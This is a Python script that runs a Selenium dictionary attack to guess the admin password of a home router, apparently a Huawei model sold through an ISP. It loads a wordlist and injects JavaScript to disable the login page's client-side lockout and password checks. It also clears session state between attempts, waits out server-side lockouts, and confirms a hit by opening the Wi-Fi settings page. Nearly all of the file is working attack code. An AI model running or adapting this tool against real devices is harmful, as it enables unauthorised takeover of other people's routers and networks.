#!/usr/bin/env python3
"""
Password Discovery Module
Discovers unknown admin passwords via dictionary attack using Selenium.

Reuses a single browser session with JS lockout bypass.
Detects server-side lockout and waits for expiry.
Outputs JSON progress for real-time reporting.
"""

import json
import logging
import signal
import sys
import time
from pathlib import Path
from typing import Optional

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)


class PasswordDiscovery:
    """Discover an unknown admin password via dictionary attack."""

    def __init__(
        self,
        target_url: str,
        wordlist_path: str,
        username: str = "admin",
        max_attempts: int = 500,
        timeout: int = 15,
        progress_callback=None,
    ):
        if not target_url.startswith("http"):
            target_url = f"https://{target_url}"
        self.target_url = target_url.rstrip("/")
        self.wordlist_path = wordlist_path
        self.username = username
        self.max_attempts = max_attempts
        self.timeout = timeout
        self.progress_callback = progress_callback

        self._driver: Optional[webdriver.Chrome] = None
        self._aborted = False

        signal.signal(signal.SIGINT, self._handle_signal)
        signal.signal(signal.SIGTERM, self._handle_signal)

    def _handle_signal(self, signum, frame):
        logger.info("Interrupt received — cleaning up...")
        self._aborted = True
        self._cleanup_driver()

    def _cleanup_driver(self):
        if self._driver:
            try:
                self._driver.quit()
            except Exception:
                pass
            self._driver = None

    def _report(self, event: dict):
        """Send progress event to callback and stdout."""
        if self.progress_callback:
            self.progress_callback(event)
        print(json.dumps(event), flush=True)

    def _load_wordlist(self) -> list:
        """Load passwords from wordlist file. Skip comments and blanks."""
        passwords = []
        path = Path(self.wordlist_path)
        if not path.exists():
            raise FileNotFoundError(f"Wordlist not found: {self.wordlist_path}")

        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.rstrip("\n\r")
                if not line or line.startswith("#"):
                    continue
                passwords.append(line)

        return passwords

    def _create_browser(self) -> webdriver.Chrome:
        """Launch headless Chrome."""
        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--ignore-certificate-errors")
        opts.add_argument("--window-size=1280,720")
        opts.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

        driver = webdriver.Chrome(options=opts)
        driver.set_page_load_timeout(self.timeout)
        return driver

    def _inject_bypasses(self):
        """Inject overlay bypass + lockout counter reset."""
        self._driver.execute_script("""
            window.CheckPassword = function() { return 0; };
            window.setDisable = function() {};
            window.DisplayWifiPldt = function() {};
            window.BandSteeringState = function() {};
            window.LockLeftTime = 0;
            window.LoginTimes = 0;
            window.FailStat = '0';
            window.Userlevel = 0;
            window.preflag = 0;
            var el = document.getElementById('pwd_modify');
            if (el) el.style.display = 'none';
            var mask = document.getElementById('base_mask');
            if (mask) mask.style.display = 'none';
        """)

    def _is_server_locked(self) -> bool:
        """Detect server-side lockout via JS variables."""
        try:
            return self._driver.execute_script("""
                var el = document.getElementById('loginfail');
                if (el && el.style.display !== 'none') return true;
                return (window.LockLeftTime || 0) > 0;
            """)
        except Exception:
            return False

    def _wait_lockout(self):
        """Wait for server-side lockout to expire."""
        max_wait = 600
        start = time.time()
        while time.time() - start < max_wait:
            try:
                remaining = self._driver.execute_script(
                    "return window.LockLeftTime || 0;"
                )
            except Exception:
                remaining = 300

            if remaining <= 0:
                break

            wait_time = min(remaining + 2, 30)
            self._report({
                "type": "lockout",
                "remaining": remaining,
                "message": f"Server-side lockout — waiting {remaining}s",
            })
            logger.info(f"Lockout active — {remaining}s remaining. Waiting...")
            time.sleep(wait_time)

    def _test_password(self, username: str, password: str) -> str:
        """
        Test a single password. Returns 'found', 'locked', or 'failed'.
        """
        try:
            # Clear cookies to ensure fresh login session each time
            try:
                self._driver.delete_all_cookies()
                self._driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
            except Exception:
                pass

            # Navigate directly to login page
            self._driver.get(self.target_url + "/login.asp")
            time.sleep(1)

            # Wait for login form to be ready
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                WebDriverWait(self._driver, 5).until(
                    EC.presence_of_element_located((By.ID, "txt_Username"))
                )
            except Exception:
                self._driver.get(self.target_url + "/")
                time.sleep(1)
                try:
                    WebDriverWait(self._driver, 5).until(
                        EC.presence_of_element_located((By.ID, "txt_Username"))
                    )
                except Exception:
                    pass

            # Inject bypasses
            self._inject_bypasses()

            # Verify login form exists
            try:
                user_field = self._driver.find_element(By.ID, "txt_Username")
                pass_field = self._driver.find_element(By.ID, "txt_Password")
            except Exception:
                logger.debug(f"Login form not found at {self._driver.current_url}")
                return "failed"

            # Fill in credentials
            user_field.clear()
            user_field.send_keys(username)
            pass_field.clear()
            pass_field.send_keys(password)

            # Click login
            login_btn = self._driver.find_element(By.ID, "button")
            login_btn.click()

            time.sleep(2.5)

            post_login_url = self._driver.current_url

            # Failed logins may redirect to / (root), not login.asp
            # Only check that we're NOT on login page or login.cgi
            if "login.asp" in post_login_url or "login.cgi" in post_login_url:
                return "failed"

            # Verify by accessing a protected page
            try:
                self._driver.get(self.target_url + "/html/amp/wlanbasic/WlanBasic.asp?2G")
                time.sleep(3)
                protected_url = self._driver.current_url

                # If redirected to login page, auth failed
                if "login.asp" in protected_url:
                    return "failed"

                # Check the page source for WiFi config indicators
                # The page uses iframes that load dynamically, so check for iframe tags
                page_source = self._driver.page_source
                has_login_form = "txt_Username" in page_source

                # If we see the login form on the protected page, we're not authenticated
                if has_login_form:
                    return "failed"

                # Check for WiFi content indicators in the page
                # Huawei pages include specific JS variables and elements when authenticated
                has_wifi_content = (
                    "WlanBasic" in protected_url or
                    "wlan" in protected_url.lower() or
                    "Ssid" in page_source or
                    "ssid" in page_source.lower() or
                    "wlanBasic" in page_source or
                    "FrameWlanSetting" in page_source or
                    "frameWlan" in page_source
                )

                # Also check that the page title isn't an error
                title = self._driver.title
                is_error = "403" in title or "Forbidden" in title or "Error" in title

                if has_wifi_content and not is_error:
                    return "found"

                # If the URL is the protected page but no specific content found,
                # it might still be valid — check if URL path matches
                if "/wlanbasic/" in protected_url.lower() and not is_error:
                    return "found"

                return "failed"

            except Exception as e:
                logger.debug(f"Protected page verification failed: {e}")
                return "failed"

            # Check if server locked us
            if self._is_server_locked():
                return "locked"

            return "failed"

        except Exception as e:
            logger.debug(f"Password test error: {e}")
            return "failed"

    def discover(self) -> dict:
        """
        Main discovery loop. Tests passwords from wordlist against router.

        Returns:
            {
                "success": bool,
                "password": str | None,
                "username": str,
                "attempted": int,
                "total": int,
                "model": str,
                "elapsed_seconds": float,
                "log": [{"attempt": int, "password": str, "status": str}, ...]
            }
        """
        start_time = time.time()

        self._report({
            "type": "start",
            "message": f"Loading wordlist from {self.wordlist_path}",
        })

        passwords = self._load_wordlist()
        total = min(len(passwords), self.max_attempts)
        passwords = passwords[:total]

        self._report({
            "type": "loaded",
            "total": total,
            "message": f"Loaded {total} passwords to test",
        })

        # Detect router model
        model = "Unknown"
        try:
            self._driver = self._create_browser()
            self._driver.get(self.target_url + "/")
            time.sleep(1)
            page_source = self._driver.page_source

            import re
            match = re.search(r"ProductName\s*=\s*['\"]([^'\"]+)['\"]", page_source)
            if match:
                model = match.group(1).encode().decode("unicode_escape").strip()

            self._report({
                "type": "model",
                "model": model,
                "message": f"Detected model: {model}",
            })
        except Exception as e:
            logger.warning(f"Model detection failed: {e}")
            self._report({
                "type": "model",
                "model": model,
                "message": f"Model detection failed: {e}",
            })
            if not self._driver:
                self._driver = self._create_browser()

        log = []
        lockout_count = 0

        for i, password in enumerate(passwords):
            if self._aborted:
                break

            # Test this password
            result = self._test_password(self.username, password)

            log_entry = {
                "attempt": i + 1,
                "password": password,
                "status": result,
            }
            log.append(log_entry)

            # Report every attempt (for real-time progress)
            self._report({
                "type": "attempt",
                "attempt": i + 1,
                "total": total,
                "password": password,
                "status": result,
            })

            if result == "found":
                elapsed = time.time() - start_time
                self._cleanup_driver()
                found_result = {
                    "success": True,
                    "password": password,
                    "username": self.username,
                    "attempted": i + 1,
                    "total": total,
                    "model": model,
                    "elapsed_seconds": round(elapsed, 1),
                    "log": log,
                }
                self._report({
                    "type": "found",
                    **found_result,
                    "message": f"PASSWORD FOUND: {password} (attempt {i+1}/{total})",
                })
                return found_result

            elif result == "locked":
                lockout_count += 1
                self._report({
                    "type": "lockout_detected",
                    "attempt": i + 1,
                    "message": f"Server-side lockout detected after attempt {i+1}",
                })
                self._wait_lockout()

            # Rate limit: brief pause between attempts
            time.sleep(0.3)

        elapsed = time.time() - start_time
        self._cleanup_driver()

        not_found_result = {
            "success": False,
            "password": None,
            "username": self.username,
            "attempted": len(log),
            "total": total,
            "model": model,
            "elapsed_seconds": round(elapsed, 1),
            "lockout_encounters": lockout_count,
            "log": log,
        }
        self._report({
            "type": "complete",
            **not_found_result,
            "message": f"Discovery complete — {len(log)} passwords tested, none found",
        })
        return not_found_result
